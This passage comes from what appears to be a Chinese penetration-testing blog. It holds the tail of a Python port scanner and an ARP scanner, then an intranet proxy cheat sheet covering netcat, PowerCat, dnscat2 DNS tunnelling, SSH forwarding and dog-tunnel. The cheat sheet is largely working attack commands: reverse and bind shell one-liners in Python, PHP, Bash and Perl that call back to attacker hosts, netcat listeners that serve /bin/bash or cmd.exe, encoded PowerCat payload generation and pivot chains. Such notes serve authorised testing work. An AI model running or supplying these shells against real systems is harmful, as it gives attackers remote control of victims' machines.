class="line">            <span class="keyword">pass</span></span><br><span class="line">            <span class="comment"># print(e)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># #socket端口扫描，返回banner信息， </span></span><br><span class="line">    <span class="comment"># # 但是由于测试中收到的信息无法解码，因此不调用该模块，先放在这里，不作处理(以前时可以的。。。。。。不知道为什么这里不行)</span></span><br><span class="line">    <span class="comment"># def socket_port_banner(self,cip):</span></span><br><span class="line">    <span class="comment">#     try:</span></span><br><span class="line">    <span class="comment">#         for port in self.default_port:</span></span><br><span class="line">    <span class="comment">#             s = socket.socket()</span></span><br><span class="line">    <span class="comment">#             s.settimeout(0.1)</span></span><br><span class="line">    <span class="comment">#             s.connect((host, port))</span></span><br><span class="line">    <span class="comment">#             s.sendall(bytes(r&#x27;aaa\r\n\r\n&#x27;, encoding=&#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="comment">#             banner = s.recv(1024)</span></span><br><span class="line">    <span class="comment">#             if banner:</span></span><br><span class="line">    <span class="comment">#                 print(Fore.GREEN + &#x27;[+] : &#x27; + str(port) + &#x27;\t&#x27; + banner.decode(&#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="comment">#             else:</span></span><br><span class="line">    <span class="comment">#                 print(Fore.GREEN + &#x27;[+] : &#x27; + str(port) + &#x27;\t&#x27; + &#x27;Unknow&#x27;)</span></span><br><span class="line">    <span class="comment">#             s.close()</span></span><br><span class="line">    <span class="comment">#     except:</span></span><br><span class="line">    <span class="comment">#         pass</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment"># # 对于存活的主机进行端口扫描的线程池</span></span><br><span class="line">    <span class="comment"># def thread_port_scan(self):</span></span><br><span class="line">    <span class="comment">#     p = ThreadPoolExecutor(self.tp)</span></span><br><span class="line">    <span class="comment">#     for ip in self.alive_ip:</span></span><br><span class="line">    <span class="comment">#         p.submit(self.socket_port_scan,ip)</span></span><br><span class="line">    <span class="comment">#     p.shutdown()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入日志文件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span>(<span class="params">l</span>):</span></span><br><span class="line">    <span class="keyword">if</span> l.result():</span><br><span class="line">        <span class="keyword">with</span> open(os.path.split(os.path.abspath(sys.argv[<span class="number">0</span>]))[<span class="number">0</span>]+<span class="string">&#x27;/surhpscan.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(str(l.result()) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 线程池，接受函数，函数参数，线程池大小</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thread_pool</span>(<span class="params">fn,pool,ips</span>):</span></span><br><span class="line">    p = ThreadPoolExecutor(pool)</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        p.submit(fn,ip).add_done_callback(log)</span><br><span class="line">    p.shutdown()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    usage = Fore.CYAN + <span class="string">&quot;%prog -i 192.168.10.0/24&quot;</span></span><br><span class="line">    parser = OptionParser(usage)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-i&#x27;</span>, <span class="string">&#x27;--ip&#x27;</span>, dest=<span class="string">&#x27;ip&#x27;</span>, help=<span class="string">&quot;设置扫描的IP地址&quot;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--threads&#x27;</span>, dest=<span class="string">&#x27;threads&#x27;</span>,</span><br><span class="line">                      help=<span class="string">&quot;同时指定,默认为None.Mac建议设置20左右,Win都可以。&quot;</span>, default=<span class="literal">None</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, dest=<span class="string">&#x27;port&#x27;</span>,</span><br><span class="line">                      help=<span class="string">&#x27;自定义端口号：80,81,88-90,90&#x27;</span>, default=<span class="literal">None</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;--ta&#x27;</span>,dest=<span class="string">&#x27;thread_alive&#x27;</span>,help=<span class="string">&#x27;探测存活主机时的线程池(默认10)&#x27;</span>,default=<span class="number">10</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;--tp&#x27;</span>, dest=<span class="string">&#x27;thread_port_scan&#x27;</span>, help=<span class="string">&#x27;端口探测时线程池(默认5)&#x27;</span>,default=<span class="number">5</span>)</span><br><span class="line">    <span class="comment"># parser.add_option()</span></span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> options.ip:</span><br><span class="line">        <span class="keyword">return</span> options.ip, options.threads, options.port, options.thread_alive, options.thread_port_scan</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit(parser.error(Fore.RED + <span class="string">&#x27;参数输入有误，请重试。&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    banner = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                    .__                                       </span></span><br><span class="line"><span class="string">  ________ _________|  |__ ______  ______ ____ _____    ____  </span></span><br><span class="line"><span class="string"> /  ___/  |  \_  __ \  |  \\\\____ \/  ___// ___\\\__  \  /    \ </span></span><br><span class="line"><span class="string"> \___ \|  |  /|  | \/   Y  \  |_&gt; &gt;___ \\\\  \___ / __ \|   |  \\</span></span><br><span class="line"><span class="string">/____  &gt;____/ |__|  |___|  /   __/____  &gt;\___  &gt;____  /___|  /</span></span><br><span class="line"><span class="string">     \/                  \/|__|       \/     \/     \/     \/ </span></span><br><span class="line"><span class="string">                                               by zhangsan V1.0</span></span><br><span class="line"><span class="string">                                                 2019-12-30</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    start_time = datetime.datetime.now()</span><br><span class="line">    print(Fore.YELLOW + banner)</span><br><span class="line">    <span class="comment"># 获取参数</span></span><br><span class="line">    inp_ip, inp_threads, inp_port, inp_thread_alive, inp_thread_port_scan = main()</span><br><span class="line">    <span class="comment"># 如果同时指定线程池，初始化时候直接传入</span></span><br><span class="line">    <span class="comment"># hosts, threads=None, ta=None, tp=None, inp_port=None</span></span><br><span class="line">    nscan = Nscan(inp_ip,inp_threads,inp_thread_alive,inp_thread_port_scan,inp_port)</span><br><span class="line">    <span class="comment"># nscan.thread_check_alive()</span></span><br><span class="line">    <span class="comment"># nscan.thread_port_scan()</span></span><br><span class="line">    <span class="comment"># print(nscan.alive_ip)</span></span><br><span class="line">    <span class="comment"># print(len(nscan.alive_ip))</span></span><br><span class="line">    <span class="comment"># print(&#x27;+++++++++++++++++++++++&#x27;)</span></span><br><span class="line">    <span class="comment"># print(len(nscan.result_port_scan))</span></span><br><span class="line">    thread_pool(nscan.check_host,nscan.ta,nscan.ips)</span><br><span class="line">    print(Fore.YELLOW + <span class="string">&#x27;[+]:存活主机扫描完毕。共发现存活主机&#123;0&#125;台&#x27;</span>.format(len(nscan.alive_ip)))</span><br><span class="line">    print(Fore.CYAN + <span class="string">&#x27;[*]---------Port Scaning--------[*]&#x27;</span>)</span><br><span class="line">    thread_pool(nscan.socket_port_scan,nscan.tp,nscan.alive_ip)</span><br><span class="line">    <span class="comment"># 输出存活主机端口结果</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> nscan.result_port_scan:</span><br><span class="line">        print(i)</span><br><span class="line">    print(Fore.YELLOW + <span class="string">&#x27;[+]:存活主机的端口已扫描完毕。有结果的共&#123;0&#125;条。&#x27;</span>.format(len(nscan.result_port_scan)))</span><br><span class="line">    end_time = datetime.datetime.now()</span><br><span class="line">    print(Fore.CYAN + <span class="string">&#x27;[Time] : 程序执行时间 &#123;0&#125; 秒&#x27;</span>.format((end_time - start_time).seconds))</span><br></pre></td></tr></table></figure>

<h2 id="ARP扫描"><a href="#ARP扫描" class="headerlink" title="ARP扫描"></a>ARP扫描</h2><p>简单使用了ARP模块，没办法，毕竟是最快的。</p>
<ul>
<li>python3 cscan.py 192.168.90.1</li>
<li>python3 cscan.py 192.168.90.0.24</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># FileName  :  cscan.py</span></span><br><span class="line"><span class="comment"># Time      :  2020/04/10 15:43:08</span></span><br><span class="line"><span class="comment"># Author    :  OuDeNiu</span></span><br><span class="line"><span class="comment"># Email     :  havebutno@gmail.com</span></span><br><span class="line"><span class="comment"># Version   :  1.0</span></span><br><span class="line"><span class="comment"># Descript  :  测试ARP</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> Fore, init</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level = logging.NOTSET,format = <span class="string">&#x27;%(message)s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动重置颜色</span></span><br><span class="line">init(autoreset=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_host_arp</span>(<span class="params">cip</span>):</span></span><br><span class="line">    a,b = srp(Ether(dst=<span class="string">&quot;ff:ff:ff:ff:ff:ff&quot;</span>)/ARP(pdst=cip),timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="comment"># print(a.res)</span></span><br><span class="line">    <span class="comment"># print(a.res)</span></span><br><span class="line">    <span class="comment"># print(a.res[0][1].getlayer(ARP).fields)</span></span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> a.res:</span><br><span class="line">        <span class="comment"># print(ip[1].getlayer(ARP).fields)</span></span><br><span class="line">        <span class="comment"># mac = ip[1].getlayer(ARP).fields[&#x27;hwsrc&#x27;]</span></span><br><span class="line">        <span class="comment"># result_ip = ip[1].getlayer(ARP).fields[&#x27;psrc&#x27;]</span></span><br><span class="line">        result_ip = ip[<span class="number">1</span>].getlayer(ARP).fields[<span class="string">&#x27;psrc&#x27;</span>]</span><br><span class="line">        logging.debug(Fore.GREEN + str(result_ip) + <span class="string">&quot; is alive.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start_time = datetime.datetime.now()</span><br><span class="line">    hosts = sys.argv[<span class="number">1</span>]</span><br><span class="line">    logging.debug(Fore.CYAN + <span class="string">&quot;开始扫描 &quot;</span> + hosts)</span><br><span class="line">    check_host_arp(hosts)</span><br><span class="line">    end_time = datetime.datetime.now()</span><br><span class="line">    print(Fore.CYAN + <span class="string">&#x27;[Time] : 程序执行时间 &#123;0&#125; 秒&#x27;</span>.format((end_time - start_time).seconds))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>原本是想加上弱口令扫描的，因为python2 的socket返回的是字符串，python3的socket是字节，部分字节无法解码就出了问题。。。没有解决所以。。。</p>
</blockquote>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>tools</tag>
        <tag>scapy</tag>
      </tags>
  </entry>
  <entry>
    <title>常用Proxy小结</title>
    <url>/posts/8949441d/</url>
    <content><![CDATA[<p>在用的内网代理。。。。。。</p>
<a id="more"></a>

<h1 id="代理小结"><a href="#代理小结" class="headerlink" title="代理小结"></a>代理小结</h1><p>先写这么多- - - - - - – </p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Jsb29kSG91bmRBRC9CbG9vZEhvdW5kL3JlbGVhc2VzL2Rvd25sb2FkLzMuMC4yL0Jsb29kSG91bmQtd2luMzIteDY0LnppcA==">https://github.com/BloodHoundAD/BloodHound/releases/download/3.0.2/BloodHound-win32-x64.zip<i class="fa fa-external-link-alt"></i></span></p>
<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>免费工具。</p>
<p>通过图形化方式将域内资源直观的展示，更好的分析域内情况。以便于更快的找到弱点。</p>
<h4 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h4><ul>
<li>Java环境</li>
<li>Neo4j数据库</li>
</ul>
<p>配套域内信息搜集工具<span class="exturl" data-url="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Jsb29kSG91bmRBRC9CbG9vZEhvdW5kL21hc3Rlci9Jbmdlc3RvcnMvU2hhcnBIb3VuZC5leGU=">https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.exe<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="代理工具"><a href="#代理工具" class="headerlink" title="代理工具"></a>代理工具</h2><h3 id="NetCat"><a href="#NetCat" class="headerlink" title="NetCat"></a>NetCat</h3><p>在LinuxNC，弹回shell且无法切到bash时候。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h4><ul>
<li>端口扫描</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -v ip port</span><br><span class="line">nc -v -z ip 1-1024</span><br></pre></td></tr></table></figure>

<ul>
<li>端口监听</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lpvv 9999</span><br><span class="line">客户端连接：nc -nvv ip port</span><br></pre></td></tr></table></figure>

<ul>
<li>文件传输</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -vn ip port &lt; text.txt -q 1				# 与目标IP建立连接并传输给IP一个文件</span><br></pre></td></tr></table></figure>

<ul>
<li>正向shell</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 服务端</span></span><br><span class="line">nc -lpvv port -e /bin/bash</span><br><span class="line">nc -lpvv port -e c:\windows\system32\cmd.exe</span><br><span class="line"><span class="comment"># 客户端</span></span><br><span class="line">nc ip port </span><br></pre></td></tr></table></figure>

<ul>
<li>反向连接</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 服务端</span></span><br><span class="line">nc -lvvp port</span><br><span class="line"><span class="comment"># 客户端</span></span><br><span class="line">nc ip port -e /bin/bash</span><br><span class="line">nc ip port -e c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>

<h4 id="其他语言连接NC"><a href="#其他语言连接NC" class="headerlink" title="其他语言连接NC"></a>其他语言连接NC</h4><ul>
<li>python</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line">python -c <span class="string">&quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&quot;</span>VPS<span class="string">&quot;,6666))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>PHP</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>                                                                                     $sock = fsockopen(<span class="string">&quot;ip&quot;</span>,port);exec(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);<span class="meta">?&gt;</span> </span><br><span class="line">  </span><br><span class="line"> php -r <span class="string">&#x27;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Bash</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.90.93/9999 0&gt;&amp;1（内网主机执行）</span><br><span class="line">nc -lvv -p 5555（公网主机执行）</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.90.93/9999 0&gt;&amp;1</span><br><span class="line">正向连接：</span><br><span class="line">ncat -lvv -p 10000 -e /bin/bash (nc -lvv -p 6666 -c bash)</span><br><span class="line">nc -n ip port</span><br><span class="line"></span><br><span class="line">反向连接：</span><br><span class="line">nc -nv ip port -c bash</span><br><span class="line">nc -lvv -p port</span><br></pre></td></tr></table></figure>

<ul>
<li>Per</li>
</ul>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;ip&quot;;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="PowerCat"><a href="#PowerCat" class="headerlink" title="PowerCat"></a>PowerCat</h3><p>根据名称即可知道，可配合Netcat也可单独用。（不过杀软）</p>
<blockquote>
<p>Set-ExecutionPolicy Unrestricted  # 设置允许所有ps脚本</p>
</blockquote>
<blockquote>
<p>Import-Module powerboat.ps1  # 导入</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">地址：https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1</span><br><span class="line">使用方法</span><br></pre></td></tr></table></figure>

<h4 id="参数："><a href="#参数：" class="headerlink" title="参数："></a>参数：</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="literal">-l</span> <span class="comment"># 监听模式</span></span><br><span class="line"><span class="literal">-p</span> <span class="comment"># 端口</span></span><br><span class="line"><span class="literal">-e</span> <span class="comment"># 指定要启动的进程的名称</span></span><br><span class="line"><span class="literal">-v</span> <span class="comment"># 显示详情</span></span><br><span class="line"><span class="literal">-ep</span> <span class="comment"># 返回powershell</span></span><br><span class="line"><span class="literal">-c</span> <span class="comment"># 指定连接的IP地址</span></span><br><span class="line"><span class="literal">-of</span> <span class="comment"># 指定接受文件后的输出文件名</span></span><br><span class="line"><span class="literal">-i</span> <span class="comment"># 输入 可写文件名｜字符串</span></span><br><span class="line"><span class="literal">-g</span> <span class="comment"># 生成payload</span></span><br><span class="line"><span class="operator">-ge</span> <span class="comment"># 编码</span></span><br></pre></td></tr></table></figure>

<ul>
<li>通过NC的正向连接PowerCat.  (本地win10测试通过)</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">8080</span> <span class="literal">-e</span> cmd.exe <span class="literal">-v</span>			<span class="comment"># 可以指定powershell</span></span><br><span class="line">		</span><br><span class="line">nc ip <span class="number">8080</span> <span class="literal">-vv</span>			<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<ul>
<li>通过nc反向连接</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvv -p 8888</span><br><span class="line"></span><br><span class="line">powercat -c ip -p port -v -e cmd.exe</span><br></pre></td></tr></table></figure>

<ul>
<li>通过powercat返回powershell </li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> port <span class="literal">-v</span></span><br><span class="line"></span><br><span class="line">powercat <span class="literal">-c</span> ip <span class="literal">-p</span> port <span class="literal">-v</span> <span class="literal">-ep</span></span><br></pre></td></tr></table></figure>

<ul>
<li>通过powercat传输文件</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">9999</span> <span class="literal">-of</span> test.txt <span class="literal">-v</span>  <span class="comment"># 接受</span></span><br><span class="line"></span><br><span class="line">powercat <span class="literal">-c</span> ip <span class="literal">-p</span> port <span class="literal">-i</span> c:\test.txt <span class="literal">-v</span>   <span class="comment"># 发送</span></span><br></pre></td></tr></table></figure>

<h4 id="生成Payload"><a href="#生成Payload" class="headerlink" title="生成Payload"></a>生成Payload</h4><p>用powercat生成的payload有正反区分且可以对其编码</p>
<ul>
<li>简单payload生成</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">8080</span> <span class="literal">-e</span> cmd <span class="literal">-v</span> <span class="literal">-g</span> &gt;&gt; shell.ps1  <span class="comment"># 将其输出到文件执行</span></span><br><span class="line">powercat <span class="literal">-c</span> ip <span class="literal">-p</span> port <span class="literal">-v</span></span><br><span class="line"></span><br><span class="line">powercat <span class="literal">-c</span> ip <span class="literal">-p</span> port <span class="literal">-ep</span> <span class="operator">-ge</span>	<span class="comment"># 生成编码的payload</span></span><br></pre></td></tr></table></figure>

<h4 id="DNS隧道通信"><a href="#DNS隧道通信" class="headerlink" title="DNS隧道通信"></a>DNS隧道通信</h4><p>其DNS通信基于dnscat，因此其服务端需要dnscat。如果实在不能安装，参考官网。。。</p>
<p>这里仅仅是Debian Linux。客户端make时候报错，但是不影响。。。可以./dnscat测试一下是否正常。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 服务端</span></span><br><span class="line">apt-get install gem</span><br><span class="line">apt-get install ruby-dev</span><br><span class="line">apt-get install libpq-dev</span><br><span class="line">apt-get install ruby-bundler</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line"><span class="built_in">cd</span> dnscat2/server/</span><br><span class="line">gem install bundler</span><br><span class="line">bundle install</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端</span></span><br><span class="line">https://downloads.skullsecurity.org/dnscat2/ </span><br><span class="line">git <span class="built_in">clone</span> https://github.com/iagox86/dnscat2.git</span><br><span class="line"><span class="built_in">cd</span> dnscat2/client/</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ruby ./dnscat2.rb ttpowercat.test <span class="literal">-e</span> open -<span class="literal">-no</span><span class="literal">-cache</span></span><br><span class="line"></span><br><span class="line">powercat <span class="literal">-c</span> ip <span class="literal">-p</span> port <span class="literal">-dns</span> ttpowercat.test <span class="literal">-e</span> cmd.exe</span><br></pre></td></tr></table></figure>

<h4 id="跳板"><a href="#跳板" class="headerlink" title="跳板"></a>跳板</h4><ul>
<li>TCP</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第一台：目标机</span></span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-v</span> <span class="literal">-p</span> <span class="number">9999</span> <span class="literal">-e</span> cmd.exe   </span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二台：跳板机</span></span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-v</span> <span class="literal">-p</span> <span class="number">8000</span> <span class="literal">-r</span> tcp:目标机地址:<span class="number">9999</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三台:攻击者</span></span><br><span class="line">nc 跳板机地址 <span class="number">8000</span> <span class="literal">-v</span></span><br></pre></td></tr></table></figure>

<ul>
<li>DNS</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 跳板机</span></span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">8000</span> <span class="literal">-r</span> dns:攻击者::ttpowercat.test</span><br><span class="line"></span><br><span class="line"><span class="comment"># 攻击者</span></span><br><span class="line">./dnscat2.rb ttpowercat.test <span class="literal">-e</span> open -<span class="literal">-no</span><span class="literal">-cache</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标机</span></span><br><span class="line">powercat <span class="literal">-c</span> 跳板机 <span class="literal">-p</span> <span class="number">8000</span> <span class="literal">-v</span> <span class="literal">-e</span> cmd.exe</span><br></pre></td></tr></table></figure>

<h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-C <span class="comment"># 压缩传输，提高速度</span></span><br><span class="line">-f <span class="comment"># SSh传输转到后台执行，不占用当前shell</span></span><br><span class="line">-N <span class="comment"># 建立静默连接(建立连接，看不到会话)</span></span><br><span class="line">-g <span class="comment"># 允许远程主机连接本地用于转发的端口</span></span><br><span class="line">-L <span class="comment"># 本地端口转发</span></span><br><span class="line">-R <span class="comment"># 远程端口转发</span></span><br><span class="line">-D <span class="comment"># 动态转发(SOCKS代理)</span></span><br><span class="line">-P <span class="comment"># 指定SSH端口</span></span><br></pre></td></tr></table></figure>

<ul>
<li>本地转发</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -CFNg -L port(VPS):ip(目标机):port(目标机) root@ip(跳板机) </span><br><span class="line"><span class="comment"># VPS执行，将目标机端口转到VPS</span></span><br></pre></td></tr></table></figure>

<ul>
<li>远程端口转发</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -CFNg -R port(VPS):ip(目标机):port(目标机) root@ip(vps) </span><br><span class="line"><span class="comment"># 内网跳板机执行，将内网目标机的端口转到VPS端口</span></span><br></pre></td></tr></table></figure>

<ul>
<li>动态转发</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -CFNg -D port(VPS) root@ip(跳板机)</span><br><span class="line"><span class="comment"># SOCK4/5代理</span></span><br></pre></td></tr></table></figure>

<h3 id="dog-tunnel-lite"><a href="#dog-tunnel-lite" class="headerlink" title="dog-tunnel-lite"></a>dog-tunnel-lite</h3><h4 id="Linux编译"><a href="#Linux编译" class="headerlink" title="Linux编译"></a>Linux编译</h4><blockquote>
<p> 我的Linux为debian_8_x64</p>
</blockquote>
<ul>
<li>首先根据Github官方的文档，进行Linux版本编译x64。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go get github.com/klauspost/reedsolomon</span><br><span class="line">go get github.com/cznic/zappy</span><br><span class="line">go get -u -d github.com/vzex/dog-tunnel &amp;&amp; cd $GOPATH/src/github.com/vzex/dog-tunnel/ &amp;&amp; git checkout udpVersion &amp;&amp; make</span><br><span class="line"><span class="meta">#</span><span class="bash"> 注意git checkout udpVersion 这个才是dog-tunnel-lite,如果git checkout master则是dog-tunnel</span></span><br></pre></td></tr></table></figure>

<p>编译成功之后，会在<code>/usr/local/gopackage/src/github.com/vzex/dog-tunnel</code>文件夹下生成如下目录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@pq:&#x2F;usr&#x2F;local&#x2F;gopackage&#x2F;src&#x2F;github.com&#x2F;vzex# tree dog-tunnel&#x2F;</span><br><span class="line">dog-tunnel&#x2F;</span><br><span class="line">├── client.go</span><br><span class="line">├── common</span><br><span class="line">│   ├── cache.go</span><br><span class="line">│   ├── cache_test.go</span><br><span class="line">│   └── common.go</span><br><span class="line">├── dog-tunnel.png</span><br><span class="line">├── dtunnel_lite</span><br><span class="line">├── HowToUse.txt</span><br><span class="line">├── ikcp</span><br><span class="line">│   ├── ikcp.go</span><br><span class="line">│   ├── ikcp_h.go</span><br><span class="line">│   ├── ikcp_test.go</span><br><span class="line">│   └── ikcp_test_h.go</span><br><span class="line">├── Makefile</span><br><span class="line">├── pipe</span><br><span class="line">│   ├── pipe.go</span><br><span class="line">│   └── pipe_test.go</span><br><span class="line">├── platform</span><br><span class="line">│   ├── platform_darwin.go</span><br><span class="line">│   ├── platform_unix.go</span><br><span class="line">│   └── platform_win.go</span><br><span class="line">├── README.md</span><br><span class="line">└── release.sh</span><br><span class="line"></span><br><span class="line">4 directories, 19 files</span><br></pre></td></tr></table></figure>

<p>此时的<code>dtunnel_lite</code>即为编译好的x64版本<code>dog-tunnel-lite</code>版。</p>
<p>本地编译时候内存溢出。。。。。。放弃了</p>
<h4 id="Windows编译-x64"><a href="#Windows编译-x64" class="headerlink" title="Windows编译  x64"></a>Windows编译  x64</h4><blockquote>
<p>我这里时Windows7_x64 。</p>
</blockquote>
<ul>
<li>Windows编译前置条件</li>
</ul>
